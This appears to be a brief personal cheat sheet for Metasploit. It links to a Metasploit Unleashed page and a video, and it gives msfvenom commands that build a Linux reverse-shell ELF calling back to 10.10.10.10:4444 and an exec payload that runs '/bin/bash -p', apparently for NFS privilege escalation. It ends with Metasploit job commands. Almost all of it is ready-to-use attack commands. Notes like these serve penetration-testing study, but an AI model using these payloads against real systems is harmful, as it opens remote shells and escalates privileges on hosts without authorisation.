https://www.offensive-security.com/metasploit-unleashed/using-databases/
https://www.youtube.com/watch?v=kdtMthVeC1M

---- MSF VENOM
msfvenom to generate a reverse shell ELF binary: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
generate a payload using msfvenom callnig /bin/bash:
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf

---- Jobs
Launch the attack as a job with the command 'run -j'.
* jobs
* jobs -i 0